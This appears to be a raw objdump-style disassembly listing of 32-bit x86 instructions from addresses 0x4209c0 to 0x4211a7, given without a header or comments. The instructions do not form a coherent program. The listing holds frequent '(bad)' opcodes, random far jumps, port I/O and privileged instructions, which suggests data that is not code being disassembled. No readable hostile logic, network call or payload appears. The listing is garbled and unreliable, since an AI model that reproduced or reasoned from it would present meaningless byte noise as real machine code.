  4209c0:	mov    ?,WORD PTR [eax]
  4209c2:	xchg   edi,eax
  4209c3:	xor    al,0x32
  4209c5:	into   
  4209c6:	add    al,0xda
  4209c8:	js     0x4209b7
  4209ca:	jb     0x420a43
  4209cc:	jmp    0x420968
  4209ce:	cld    
  4209cf:	jmp    0x3d68:0x7ac78b63
  4209d6:	in     al,0xc2
  4209d8:	mov    dh,cl
  4209da:	xor    DWORD PTR [ecx+0x1f669958],ebx
  4209e0:	sub    ecx,DWORD PTR [edi-0x37]
  4209e3:	or     BYTE PTR [edx-0x59],dl
  4209e6:	pop    eax
  4209e7:	cmp    DWORD PTR [edx+edi*8+0xd18f2c5],esp
  4209ee:	sar    DWORD PTR [edi-0x7ab9e8d6],0xcf
  4209f5:	(bad)  
  4209f6:	ror    al,cl
  4209f8:	adc    BYTE PTR [ebx+0x5ce2d6af],bl
  4209fe:	ret    0xfd0b
  420a01:	or     DWORD PTR [esp+ebx*8],esi
  420a04:	scas   eax,DWORD PTR es:[edi]
  420a05:	add    bh,BYTE PTR [esi]
  420a07:	pop    esp
  420a08:	(bad)  
  420a09:	shr    DWORD PTR [esp+eax*1],cl
  420a0c:	sbb    eax,0xa351173d
  420a11:	dec    edi
  420a12:	push   0x57
  420a14:	(bad)  
  420a15:	push   0x6d
  420a17:	xchg   ebp,eax
  420a18:	xor    DWORD PTR [ebp-0x3c688ac8],ebp
  420a1e:	pop    esi
  420a1f:	je     0x4209b0
  420a21:	loop   0x4209a5
  420a23:	and    eax,0x1d6967d2
  420a28:	mov    DWORD PTR [ebx-0x69],ebp
  420a2b:	sar    BYTE PTR [edi+0x7c],0x37
  420a2f:	std    
  420a30:	xchg   ebx,eax
  420a31:	jno    0x420aa1
  420a33:	mov    DWORD PTR [edi+0x6385e40],ebx
  420a39:	add    eax,0xa4056e77
  420a3e:	xchg   esi,eax
  420a3f:	pop    esi
  420a40:	icebp  
  420a41:	lods   eax,DWORD PTR ds:[esi]
  420a42:	push   0xd2333014
  420a47:	mov    ah,BYTE PTR [ebx]
  420a49:	dec    ebp
  420a4a:	sub    ebp,0x61d9f004
  420a50:	mov    eax,ds:0xc3f9d88b
  420a55:	cli    
  420a56:	adc    eax,0xf52c40b4
  420a5b:	ret    0x738e
  420a5e:	imul   esp,DWORD PTR [ebx+0x5],0x18a026be
  420a65:	or     al,0xd4
  420a67:	out    0x4d,eax
  420a69:	into   
  420a6a:	sub    eax,0x82836a9e
  420a6f:	xor    eax,0x9820a7d1
  420a74:	test   BYTE PTR [eax+0x5d],0xa8
  420a78:	add    eax,0xeeb22e10
  420a7d:	adc    al,0xfa
  420a7f:	jmp    0x2f98d024
  420a84:	arpl   si,si
  420a86:	adc    cl,al
  420a88:	and    dh,BYTE PTR [ebx+0x6779e197]
  420a8e:	and    BYTE PTR [edi+edx*8],ch
  420a91:	jecxz  0x420b12
  420a93:	pusha  
  420a94:	mov    es,esi
  420a96:	outs   dx,DWORD PTR ds:[esi]
  420a98:	fdivr  QWORD PTR [ebx+eax*1+0x1f534dfc]
  420a9f:	cmp    BYTE PTR [edi],al
  420aa1:	add    DWORD PTR [ecx-0x1d],ebp
  420aa4:	inc    ecx
  420aa5:	mov    ds:0xf103947a,al
  420aaa:	gs das 
  420aac:	lods   eax,DWORD PTR cs:[esi]
  420aae:	sti    
  420aaf:	test   eax,0xf541b646
  420ab4:	sbb    DWORD PTR [ebx+0x3d],edx
  420ab7:	xchg   BYTE PTR [ebx+ebx*1],ch
  420aba:	out    0xf4,eax
  420abc:	das    
  420abd:	push   edi
  420abe:	mov    ah,BYTE PTR [eax+0x7ce33387]
  420ac4:	sbb    DWORD PTR [esi+0x78a877bf],eax
  420aca:	jae    0x420aea
  420acc:	retf   0x9911
  420acf:	fs scas al,BYTE PTR es:[edi]
  420ad1:	mov    al,ds:0xdac0cce
  420ad6:	jp     0x420acd
  420ad8:	jmp    0x720f2b41
  420add:	std    
  420ade:	xlat   BYTE PTR ds:[ebx]
  420adf:	out    dx,al
  420ae0:	inc    esp
  420ae1:	xchg   ecx,eax
  420ae2:	cmp    edx,DWORD PTR [ebp-0x248300ef]
  420ae8:	aam    0x2f
  420aea:	ret    0xb816
  420aed:	shr    bh,0x31
  420af0:	hlt    
  420af1:	mov    cl,0xfe
  420af3:	pop    DWORD PTR [ecx]
  420af5:	push   ds
  420af6:	sub    al,ah
  420af8:	add    al,0x5a
  420afa:	lods   al,BYTE PTR ds:[esi]
  420afb:	fsubr  QWORD PTR [ebx]
  420afd:	popa   
  420afe:	jecxz  0x420b5a
  420b00:	push   ebx
  420b01:	ds std 
  420b03:	sub    ebx,DWORD PTR [edx-0x13]
  420b06:	mov    ds:0x5982da98,al
  420b0b:	fild   DWORD PTR [ebx-0x2a]
  420b0e:	pop    edx
  420b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b10:	mov    esp,0x1e82bdc7
  420b15:	iret   
  420b16:	in     al,0x33
  420b18:	stc    
  420b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b1a:	mov    bl,0x91
  420b1c:	mov    dh,0x2f
  420b1e:	add    BYTE PTR [ebx+0x67],cl
  420b21:	(bad)  
  420b22:	(bad)  
  420b23:	dec    esi
  420b24:	push   es
  420b25:	bound  esp,QWORD PTR [ebx]
  420b27:	call   0x890f344f
  420b2c:	sbb    eax,0x4c75ae40
  420b31:	sbb    al,0x90
  420b33:	xor    edi,ecx
  420b35:	push   esi
  420b36:	cmp    al,0xa5
  420b38:	adc    dh,ah
  420b3a:	xchg   esp,eax
  420b3b:	out    dx,al
  420b3c:	or     eax,0xc7ba94b0
  420b41:	mov    eax,0x57b2938
  420b46:	fst    DWORD PTR [ebx+ebp*2]
  420b49:	mov    dh,0xce
  420b4b:	xor    BYTE PTR [edi],dh
  420b4d:	imul   edx,DWORD PTR [ecx-0x747adcfb],0x3e6067ca
  420b57:	sar    BYTE PTR [ebx+0x2cb9387e],cl
  420b5d:	ja     0x420b5e
  420b5f:	mov    esp,0x1ecd1e54
  420b64:	popa   
  420b65:	push   ebx
  420b66:	inc    ebx
  420b67:	pushf  
  420b68:	rol    DWORD PTR [ebp+0x24e238bf],cl
  420b6e:	ins    BYTE PTR es:[edi],dx
  420b6f:	shl    bl,cl
  420b71:	cs mov bh,dh
  420b74:	ret    0x267b
  420b77:	add    dh,BYTE PTR ds:0x4d7e66f6
  420b7d:	shr    BYTE PTR [ebx],1
  420b7f:	fmul   QWORD PTR ds:0x1f9b1dcd
  420b85:	popf   
  420b86:	cdq    
  420b87:	xchg   ebp,eax
  420b88:	xor    esi,ecx
  420b8a:	out    dx,al
  420b8b:	es icebp 
  420b8d:	dec    edi
  420b8e:	imul   eax,DWORD PTR [eax-0x7211d31b],0x1dee340a
  420b98:	sbb    al,0x3c
  420b9a:	das    
  420b9b:	stc    
  420b9c:	xchg   ebx,eax
  420b9d:	in     al,dx
  420b9e:	les    ebp,FWORD PTR [edi+0x2f]
  420ba1:	jge    0x420b4e
  420ba3:	(bad)  
  420ba4:	dec    eax
  420ba5:	push   edx
  420ba6:	inc    edi
  420ba7:	push   esp
  420ba8:	dec    ebx
  420ba9:	fdiv   st,st(3)
  420bab:	pushf  
  420bac:	imul   ebp,DWORD PTR [esi+eiz*4+0x75],0x5f
  420bb1:	or     eax,0x4b886709
  420bb6:	ret    
  420bb7:	cmp    BYTE PTR [edx+0x34],cl
  420bba:	push   esi
  420bbb:	adc    BYTE PTR [edi],0xb6
  420bbe:	xlat   BYTE PTR ds:[ebx]
  420bbf:	ja     0x420b7e
  420bc1:	mov    ebp,0xdd9fad9
  420bc6:	arpl   WORD PTR [ebx+0x47e4eeba],ax
  420bcc:	aam    0x41
  420bce:	pop    es
  420bcf:	fwait
  420bd0:	jo     0x420c46
  420bd2:	or     bh,al
  420bd4:	xchg   ebp,eax
  420bd5:	arpl   WORD PTR [ecx+0x11],ax
  420bd8:	ins    BYTE PTR es:[edi],dx
  420bd9:	clc    
  420bda:	jp     0x420c2e
  420bdc:	inc    esi
  420bdd:	inc    esp
  420bde:	repnz or eax,0xa298acbd
  420be4:	sahf   
  420be5:	inc    eax
  420be6:	fimul  DWORD PTR [esi]
  420be8:	push   edx
  420be9:	adc    BYTE PTR [esi-0x311a2619],dl
  420bef:	lea    esp,[edi-0x5e79e19b]
  420bf5:	test   DWORD PTR [ebx-0x47b52fa3],edx
  420bfb:	std    
  420bfc:	mov    al,0xf9
  420bfe:	inc    ebp
  420bff:	and    eax,0x6152c878
  420c04:	fwait
  420c05:	ret    
  420c06:	cwde   
  420c07:	xchg   ecx,eax
  420c08:	ror    DWORD PTR [edi-0x18],cl
  420c0b:	mov    al,0xa2
  420c0d:	(bad)  
  420c0e:	push   0xffffffcb
  420c10:	pusha  
  420c11:	bound  eax,QWORD PTR [esp+ebx*8-0x35]
  420c15:	jb     0x420bef
  420c17:	jp     0x420c06
  420c19:	iret   
  420c1a:	sub    edx,DWORD PTR [esi-0x76]
  420c1d:	adc    eax,0xd10c7d2d
  420c22:	or     cl,BYTE PTR [eax+0x5c1092e8]
  420c28:	mov    esp,cs
  420c2a:	mov    eax,ds
  420c2c:	add    bl,BYTE PTR [edi-0x354c9c5e]
  420c32:	sub    eax,0x8cfe963
  420c37:	imul   ecx,DWORD PTR [esi+0x50a67f96],0x198d38d2
  420c41:	sub    dl,BYTE PTR [edx-0x21]
  420c44:	adc    BYTE PTR [edx+0x62],cl
  420c47:	sbb    esi,esp
  420c49:	inc    edx
  420c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c4b:	or     edx,DWORD PTR [ebp+0x89f1a77]
  420c51:	xchg   ecx,eax
  420c52:	and    ch,BYTE PTR [edi-0x57e0571d]
  420c58:	mov    al,ds:0xd0f35a2c
  420c5d:	sar    DWORD PTR [edi+0x5a],0xb6
  420c61:	and    al,0xfd
  420c63:	lock adc eax,0x18cc34c
  420c69:	and    edi,DWORD PTR [ebx+0x6b]
  420c6c:	sbb    esp,ecx
  420c6e:	lea    eax,[esi+ecx*1+0x5d75f2e7]
  420c75:	fs jo  0x420c1b
  420c78:	mov    ebx,0x24d5e562
  420c7d:	int3   
  420c7e:	ror    DWORD PTR ds:0x234491f,1
  420c84:	cmp    al,0x42
  420c86:	loopne 0x420ca5
  420c88:	dec    eax
  420c89:	(bad)
  420c8c:	loopne 0x420caa
  420c8e:	(bad)  
  420c8f:	and    DWORD PTR [eax-0x53],eax
  420c92:	imul   ecx,eax,0xffffff94
  420c95:	pop    eax
  420c96:	mov    al,0x7a
  420c98:	add    ch,bl
  420c9a:	push   ecx
  420c9b:	adc    DWORD PTR [eax],esi
  420c9d:	adc    al,0xa2
  420c9f:	cdq    
  420ca0:	cli    
  420ca1:	inc    esi
  420ca2:	fwait
  420ca3:	rcl    BYTE PTR [ebp-0x2388ce99],1
  420ca9:	hlt    
  420caa:	add    ebp,DWORD PTR ds:0x4133dedb
  420cb0:	sbb    al,bl
  420cb2:	repnz retf 
  420cb4:	rcr    DWORD PTR [ebp-0x5a],cl
  420cb7:	(bad)  
  420cb8:	loope  0x420c5b
  420cba:	and    ebx,edx
  420cbc:	cmp    DWORD PTR [ecx+0xae04106],0xffffff8c
  420cc3:	mov    ss,WORD PTR [ecx]
  420cc5:	or     DWORD PTR [esi-0x1],eax
  420cc8:	popf   
  420cc9:	dec    edx
  420cca:	adc    eax,0xb7c489ea
  420ccf:	pop    ebp
  420cd0:	sbb    al,bh
  420cd2:	js     0x420ced
  420cd4:	stos   BYTE PTR es:[edi],al
  420cd5:	xchg   edi,eax
  420cd6:	inc    esi
  420cd7:	dec    ebx
  420cd8:	test   eax,0x97dd68e8
  420cdd:	mov    dh,0xf5
  420cdf:	test   BYTE PTR [edx+ecx*2-0x4847d04],ch
  420ce6:	jg     0x420c96
  420ce8:	sub    ebx,ebx
  420cea:	sbb    eax,0xc5e6e5d7
  420cef:	fisttp QWORD PTR [eax-0x5b0d7361]
  420cf5:	imul   DWORD PTR [ecx-0x4]
  420cf8:	test   BYTE PTR [edx],bl
  420cfa:	arpl   bp,si
  420cfc:	mov    WORD PTR [edx-0x72],?
  420cff:	or     BYTE PTR [esi+0x6c],bh
  420d02:	jge    0x420d5e
  420d04:	xchg   ebx,eax
  420d05:	jno    0x420cd5
  420d07:	test   eax,0x9dd10708
  420d0c:	jl     0x420d31
  420d0e:	dec    eax
  420d0f:	push   esp
  420d10:	cmp    edi,ebp
  420d12:	jmp    DWORD PTR [edx]
  420d14:	loop   0x420d59
  420d16:	mov    edx,0xf63b3981
  420d1b:	dec    eax
  420d1c:	jb     0x420d46
  420d1e:	retf   
  420d1f:	pop    edi
  420d20:	adc    eax,0xc91161d7
  420d25:	cwde   
  420d26:	addr16 pop es
  420d28:	mov    dh,0x27
  420d2a:	push   edi
  420d2b:	imul   esp,ebp,0x9
  420d2e:	pop    esi
  420d2f:	(bad)  
  420d30:	jnp    0x420daf
  420d32:	shl    BYTE PTR [edx-0x61],cl
  420d35:	push   ss
  420d36:	aaa    
  420d37:	cmp    al,0x42
  420d39:	mov    ebx,0x1e923c5a
  420d3e:	xchg   ebp,eax
  420d3f:	les    edx,FWORD PTR [eax]
  420d41:	out    dx,eax
  420d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d43:	mov    ebp,0xd0695231
  420d48:	test   eax,0xa35e402e
  420d4d:	ins    DWORD PTR es:[edi],dx
  420d4e:	pushf  
  420d4f:	ds (bad) 
  420d51:	jg     0x420dbe
  420d53:	iret   
  420d54:	je     0x420d9c
  420d56:	lds    eax,FWORD PTR [esi]
  420d58:	(bad)  
  420d59:	mov    al,ds:0x865a345b
  420d5e:	sub    BYTE PTR [esi-0x7a],0x44
  420d62:	xchg   ebx,eax
  420d63:	cdq    
  420d64:	in     eax,dx
  420d65:	sbb    al,0xf1
  420d67:	(bad)  
  420d68:	scas   eax,DWORD PTR es:[edi]
  420d69:	fisub  WORD PTR [ebx]
  420d6b:	es pop esp
  420d6d:	jmp    0xbeeb:0xee02e78e
  420d74:	push   cs
  420d75:	jb     0x420cfc
  420d77:	xchg   ebp,esi
  420d79:	or     eax,0x46687c41
  420d7e:	stc    
  420d7f:	fdiv   st,st(5)
  420d81:	lahf   
  420d82:	jne    0x420da2
  420d84:	pop    eax
  420d85:	cmc    
  420d86:	(bad)  
  420d87:	mov    edx,0xc13a988e
  420d8c:	imul   ebp,DWORD PTR [edi],0x6c45b47b
  420d92:	mov    ebp,0x69100977
  420d97:	xor    eax,0x5af8911
  420d9c:	enter  0xa918,0x6a
  420da0:	xor    al,0x2c
  420da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420da3:	inc    edi
  420da4:	or     ch,BYTE PTR [edx-0x5a]
  420da7:	stos   DWORD PTR es:[edi],eax
  420da8:	push   ebp
  420da9:	popa   
  420daa:	add    bl,BYTE PTR [ebp-0x794be123]
  420db0:	inc    ebx
  420db1:	adc    al,0xe
  420db3:	out    0x21,eax
  420db5:	jb     0x420d4d
  420db7:	pop    esi
  420db8:	mov    edi,0x286c7339
  420dbd:	mov    edi,0x26bb9d7a
  420dc2:	xor    al,0x99
  420dc4:	cmp    dl,BYTE PTR [ebx]
  420dc6:	mov    esi,0xc5dcab5c
  420dcb:	xchg   ebx,eax
  420dcc:	sbb    eax,0x79044e7b
  420dd1:	adc    eax,0x2a83f11a
  420dd6:	rol    BYTE PTR [edx-0x1f466d9a],0x4d
  420ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dde:	inc    ecx
  420ddf:	cmp    BYTE PTR [ecx-0x77c320bb],al
  420de5:	jp     0x420e0e
  420de7:	mov    ebp,0x598e52b9
  420dec:	jmp    0xb394:0xe595122a
  420df3:	out    0xec,eax
  420df5:	popa   
  420df6:	dec    ebp
  420df7:	pop    edi
  420df8:	aaa    
  420df9:	sahf   
  420dfa:	loopne 0x420da8
  420dfc:	or     eax,0xeea59d1a
  420e01:	pusha  
  420e02:	nop
  420e03:	sbb    ebx,DWORD PTR [ecx]
  420e05:	fwait
  420e06:	pop    ebx
  420e07:	jl     0x420e55
  420e09:	(bad)  
  420e0a:	clc    
  420e0b:	xor    DWORD PTR [eax],ecx
  420e0d:	in     eax,0x46
  420e0f:	mov    eax,ds:0x31aa0470
  420e14:	test   al,0xac
  420e16:	and    esi,edx
  420e18:	dec    ebx
  420e19:	inc    esp
  420e1a:	outs   dx,DWORD PTR ds:[esi]
  420e1b:	imul   ecx,DWORD PTR [edx+0x29c6a33f],0xffffffbb
  420e22:	inc    ebx
  420e23:	and    DWORD PTR [esi],edi
  420e25:	mov    bh,ah
  420e27:	add    dh,cl
  420e29:	sti    
  420e2a:	push   ebp
  420e2b:	repnz sub al,0x37
  420e2e:	mov    BYTE PTR [ecx+0x74],dh
  420e31:	or     eax,0x4ffa7766
  420e36:	or     BYTE PTR [eax-0x63],al
  420e39:	cdq    
  420e3a:	outs   dx,DWORD PTR ds:[esi]
  420e3b:	or     eax,0x8ef984a2
  420e40:	xor    al,0x25
  420e42:	pop    eax
  420e43:	loope  0x420df3
  420e45:	dec    esp
  420e46:	in     eax,dx
  420e47:	stos   BYTE PTR es:[edi],al
  420e48:	jne    0x420ea4
  420e4a:	xor    DWORD PTR [eax-0x31],ebp
  420e4d:	aas    
  420e4e:	js     0x420dff
  420e50:	and    al,0xae
  420e52:	mov    es,esi
  420e54:	and    BYTE PTR [ecx-0x37c18903],bl
  420e5a:	mov    BYTE PTR [edx],al
  420e5c:	or     al,0x1c
  420e5e:	call   0xcafe:0x3dc4f662
  420e65:	nop
  420e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e67:	adc    eax,0x33632981
  420e6c:	cmp    al,0x67
  420e6e:	ins    BYTE PTR es:[edi],dx
  420e6f:	lods   al,BYTE PTR ds:[esi]
  420e70:	mov    cl,0xf0
  420e72:	ins    BYTE PTR es:[edi],dx
  420e73:	sbb    ebx,DWORD PTR [eax]
  420e75:	sbb    BYTE PTR [edi+ebx*4+0x43e87457],dl
  420e7c:	test   DWORD PTR [edi+0x5b],edx
  420e7f:	xor    ch,bh
  420e81:	int    0x12
  420e83:	pusha  
  420e84:	push   0xfffffff8
  420e86:	ror    DWORD PTR [esi],cl
  420e88:	dec    esi
  420e89:	fstp   st(2)
  420e8b:	mov    dl,0x67
  420e8d:	xor    al,0x57
  420e8f:	sbb    al,0xe2
  420e91:	push   0x870e39df
  420e96:	sub    edi,DWORD PTR [ebp-0x4e]
  420e99:	push   fs
  420e9b:	rcpps  xmm1,XMMWORD PTR ds:0xda3f848e
  420ea2:	not    BYTE PTR [edi+0x159ba96a]
  420ea8:	adc    al,0xd1
  420eaa:	adc    ecx,DWORD PTR [edx-0x6eff7174]
  420eb0:	inc    edx
  420eb1:	push   esi
  420eb2:	leave  
  420eb3:	sub    esp,ebx
  420eb5:	cld    
  420eb6:	mov    edi,edx
  420eb8:	jo     0x420ea3
  420eba:	and    DWORD PTR [ecx+0x3662cbdf],esi
  420ec0:	mov    ecx,0xec2d25d
  420ec5:	cwd    
  420ec7:	dec    eax
  420ec8:	into   
  420ec9:	push   ds
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     ah,BYTE PTR [esi-0x7db685c]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	mov    BYTE PTR [esi],al
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	and    BYTE PTR [ebx+0x71],al
  420ee5:	mov    dh,0x24
  420ee7:	in     eax,0x29
  420ee9:	in     al,0x5f
  420eeb:	repnz pop edx
  420eed:	stos   DWORD PTR es:[edi],eax
  420eee:	test   eax,0xa79f7f0e
  420ef3:	dec    esi
  420ef4:	outs   dx,DWORD PTR ds:[esi]
  420ef5:	sbb    eax,0x1fa2aa62
  420efa:	mov    edi,0xef66e060
  420eff:	mov    ebx,0x9a7137a8
  420f04:	xchg   ecx,eax
  420f05:	mov    al,ds:0xa25119c4
  420f0a:	add    eax,0x204b380e
  420f0f:	and    eax,DWORD PTR [edx-0x6e]
  420f12:	lods   al,BYTE PTR ds:[esi]
  420f13:	jb     0x420ef1
  420f15:	pop    ebp
  420f16:	xchg   esi,eax
  420f17:	add    DWORD PTR [ebx],eax
  420f19:	jbe    0x420ed7
  420f1b:	jecxz  0x420f14
  420f1d:	xor    BYTE PTR [eax-0x1d9a90f0],dh
  420f23:	mul    DWORD PTR ds:0xc5fc1646
  420f29:	icebp  
  420f2a:	pop    ds
  420f2b:	cmp    ch,ch
  420f2d:	sub    DWORD PTR [edi+0xe],ebx
  420f30:	lds    esi,FWORD PTR [edx]
  420f32:	mov    ebx,0x66cbc600
  420f37:	xor    BYTE PTR [esi-0x78037c24],bh
  420f3d:	test   al,0x13
  420f3f:	les    eax,FWORD PTR [edi]
  420f41:	push   ebp
  420f42:	add    al,0x41
  420f44:	adc    al,0xa4
  420f46:	fdiv   st(3),st
  420f48:	int    0x72
  420f4a:	repnz not BYTE PTR [esi]
  420f4d:	jbe    0x420eeb
  420f4f:	and    al,0x73
  420f51:	push   ebx
  420f52:	stos   BYTE PTR es:[edi],al
  420f53:	mov    ah,0x13
  420f55:	ins    DWORD PTR es:[edi],dx
  420f56:	add    BYTE PTR [edx],dh
  420f58:	clc    
  420f59:	adc    DWORD PTR [ebp-0x5],ecx
  420f5c:	push   0xb0aeebf9
  420f61:	pcmpgtw mm7,QWORD PTR ds:0x791008b9
  420f68:	lods   al,BYTE PTR ds:[esi]
  420f69:	shr    DWORD PTR [ecx+0x3c5628f7],0x9f
  420f70:	repz or BYTE PTR [ecx+0x24244f04],0xe
  420f78:	xor    ebx,0xffffff9b
  420f7b:	aad    0x3a
  420f7d:	xor    ebp,ebp
  420f7f:	adc    edi,edi
  420f81:	push   esi
  420f82:	mov    ebp,gs
  420f84:	jb     0x420f23
  420f86:	jno    0x420f3c
  420f88:	push   0xffffffb2
  420f8a:	adc    bl,ch
  420f8c:	inc    esp
  420f8d:	stc    
  420f8e:	xor    eax,0x109e8573
  420f93:	inc    ebp
  420f94:	jmp    0x420fd9
  420f96:	hlt    
  420f97:	mov    bl,0xc7
  420f99:	test   BYTE PTR [edx],0xbc
  420f9c:	rcr    BYTE PTR [ecx],0x13
  420f9f:	mov    WORD PTR [ecx+0x2e],?
  420fa2:	mov    al,ds:0x5830f82a
  420fa7:	js     0x420f6c
  420fa9:	enter  0xee25,0xab
  420fad:	push   0x16
  420faf:	push   ebx
  420fb0:	xchg   ecx,eax
  420fb1:	das    
  420fb2:	retf   0x5588
  420fb5:	aaa    
  420fb6:	sbb    al,0x8a
  420fb8:	int    0x46
  420fba:	adc    eax,0xb254c09a
  420fbf:	bound  esp,QWORD PTR [eax+0x58]
  420fc2:	imul   esi,DWORD PTR [ebp+0x28],0xc8316da5
  420fc9:	mov    ah,0xc3
  420fcb:	adc    ecx,DWORD PTR [ebx]
  420fcd:	pop    es
  420fce:	push   eax
  420fcf:	dec    edx
  420fd0:	inc    esi
  420fd1:	jo     0x420fb8
  420fd3:	mov    dh,0xd2
  420fd5:	repz sbb bl,BYTE PTR [edi+0x1b838a0c]
  420fdc:	aad    0xa4
  420fde:	adc    DWORD PTR [esp+edi*4],esi
  420fe1:	sbb    edx,DWORD PTR [ebp-0x49b0cd0f]
  420fe7:	pop    eax
  420fe8:	sub    DWORD PTR [esi+esi*2],edx
  420feb:	test   al,0xc
  420fed:	cmp    al,0x3f
  420fef:	xchg   ebx,eax
  420ff0:	inc    esi
  420ff1:	xchg   edi,eax
  420ff2:	xchg   ebp,eax
  420ff3:	cs enter 0x534,0xb6
  420ff8:	sahf   
  420ff9:	(bad)  
  420ffa:	inc    ebx
  420ffb:	inc    esp
  420ffc:	sbb    BYTE PTR [edi],dh
  420ffe:	fidivr WORD PTR [esi-0x3ca917c7]
  421004:	mov    al,0xe5
  421006:	pop    ebx
  421007:	adc    eax,0x99cda41c
  42100c:	call   DWORD PTR [esi]
  42100e:	push   ebx
  42100f:	rcl    cl,0x88
  421012:	scas   eax,DWORD PTR es:[edi]
  421013:	popf   
  421014:	mov    eax,0x55dd644c
  421019:	imul   esp,DWORD PTR [eax+0x13],0xbefe4f54
  421020:	jecxz  0x421041
  421022:	ret    0x279a
  421025:	mov    al,0x5f
  421027:	int3   
  421028:	loopne 0x4210a5
  42102a:	dec    esp
  42102b:	idiv   DWORD PTR [edi+0x64]
  42102e:	fsub   st(3),st
  421030:	(bad)  
  421031:	mov    ss,WORD PTR [ebx-0x25ac6683]
  421037:	das    
  421038:	add    al,0x53
  42103a:	icebp  
  42103b:	enter  0xde72,0x92
  42103f:	iret   
  421040:	mov    dl,0xd9
  421042:	pop    ss
  421043:	mov    eax,0xe5ee7af7
  421048:	nop
  421049:	(bad)  
  42104a:	fwait
  42104b:	aad    0x94
  42104d:	pop    esi
  42104e:	(bad)  
  42104f:	sub    eax,0x7d6f169e
  421054:	loopne 0x421031
  421056:	stos   DWORD PTR es:[edi],eax
  421057:	daa    
  421058:	mov    ds:0x2bb3815,eax
  42105d:	out    0xc5,al
  42105f:	pop    edx
  421060:	push   0xbc3c06
  421065:	ds js  0x4210c8
  421068:	ror    DWORD PTR [edi+0x4d],0xb6
  42106c:	jmp    0xc7bc:0xb6419306
  421073:	mov    ebx,0x78ae0c38
  421078:	sbb    cl,BYTE PTR [ecx-0x498fe9aa]
  42107e:	inc    ebx
  42107f:	scas   al,BYTE PTR es:[edi]
  421080:	mov    cl,0xcd
  421082:	stos   BYTE PTR es:[edi],al
  421083:	mov    al,ds:0x98c66b52
  421088:	retf   0xe670
  42108b:	test   al,0xbc
  42108d:	dec    edi
  42108e:	pop    edi
  42108f:	push   DWORD PTR [ecx-0x5d503510]
  421095:	jl     0x421045
  421097:	adc    ah,BYTE PTR [esp+0x9]
  42109b:	inc    esi
  42109c:	(bad)  
  42109d:	push   0x8dbed5cb
  4210a2:	fcmovbe st,st(7)
  4210a4:	dec    edx
  4210a5:	popf   
  4210a6:	push   cs
  4210a7:	in     al,0x16
  4210a9:	xchg   edx,eax
  4210aa:	ds jmp 0x421118
  4210ad:	ss dec ebp
  4210af:	pop    edx
  4210b0:	mov    dh,0xc2
  4210b2:	xchg   edi,eax
  4210b3:	dec    DWORD PTR [ebx-0x5d791e08]
  4210b9:	cmc    
  4210ba:	adc    eax,0x44931464
  4210bf:	call   0x99c8a5bb
  4210c4:	cs dec ecx
  4210c6:	xor    eax,0xe36e3bf2
  4210cb:	push   ebp
  4210cc:	lds    ebx,FWORD PTR [ebp+0x41b6f9f4]
  4210d2:	pop    eax
  4210d3:	popa   
  4210d4:	mov    ds:0xd08ee975,eax
  4210d9:	mov    edx,0x3c6b9300
  4210de:	fld    QWORD PTR ds:0xf90ac12f
  4210e4:	nop
  4210e5:	es cs dec ecx
  4210e8:	push   edx
  4210e9:	clc    
  4210ea:	lds    edx,FWORD PTR [edi-0x57]
  4210ed:	add    BYTE PTR [esi-0x170c623f],0xd6
  4210f4:	leave  
  4210f5:	popa   
  4210f6:	jecxz  0x421148
  4210f8:	mov    edx,0xe969203b
  4210fd:	pop    ebp
  4210fe:	push   es
  4210ff:	fdivr  QWORD PTR [edi+0x17ae3549]
  421105:	push   esp
  421106:	and    eax,0xc87fa671
  42110b:	and    DWORD PTR [ebx],ebx
  42110d:	pop    esi
  42110e:	mov    ah,0x1d
  421110:	aad    0xbc
  421112:	les    esi,FWORD PTR [ecx+0x4229105e]
  421118:	in     al,dx
  421119:	cmp    eax,0x9af76b2e
  42111e:	outs   dx,BYTE PTR ds:[esi]
  42111f:	cdq    
  421120:	push   cs
  421121:	pop    ss
  421122:	loope  0x4210f2
  421124:	dec    ecx
  421125:	push   ebx
  421126:	das    
  421127:	push   0x5266a894
  42112c:	push   ebp
  42112d:	shr    bl,1
  42112f:	pop    edx
  421130:	cmp    DWORD PTR [eax+eiz*2],ebx
  421133:	shl    dh,1
  421135:	es lahf 
  421137:	lods   al,BYTE PTR ds:[esi]
  421138:	mov    ds:0xa536e1bc,al
  42113d:	mov    esp,0x748d841c
  421142:	ins    DWORD PTR es:[edi],dx
  421143:	mov    al,0xa9
  421145:	lods   eax,DWORD PTR ds:[esi]
  421146:	repnz mov ds:0x4a3f7ff8,eax
  42114c:	(bad)  
  42114d:	xor    al,0x4
  42114f:	jne    0x421192
  421151:	xor    ebp,DWORD PTR [ecx+ebx*1+0x52411270]
  421158:	jbe    0x42119f
  42115a:	pop    edi
  42115b:	sbb    eax,0xa87a1f57
  421160:	test   ebx,ebx
  421162:	pop    ds
  421163:	cli    
  421164:	adc    bh,BYTE PTR [esi+0xa5af294]
  42116a:	stos   BYTE PTR es:[edi],al
  42116b:	jns    0x4211d4
  42116d:	icebp  
  42116e:	sub    ah,BYTE PTR [edx]
  421170:	gs data16 sbb al,0x47
  421174:	rcl    DWORD PTR [eax-0x1e27a96f],cl
  42117a:	stos   DWORD PTR es:[edi],eax
  42117b:	call   0xa262e1e0
  421180:	loope  0x42114a
  421182:	stos   DWORD PTR es:[edi],eax
  421183:	xchg   esp,eax
  421184:	or     eax,0x2843f71a
  421189:	pop    esi
  42118a:	hlt    
  42118b:	rol    BYTE PTR [ebx-0x47],cl
  42118e:	sub    al,0x5e
  421190:	(bad)  
  421191:	sub    eax,0x8b5b11cc
  421196:	cmp    eax,0xe5fc8318
  42119b:	or     DWORD PTR [edi+0x61b07681],edi
  4211a1:	nop
  4211a2:	add    esi,esp
  4211a4:	sub    BYTE PTR [esi],dl
  4211a6:	dec    edi
  4211a7:	nop
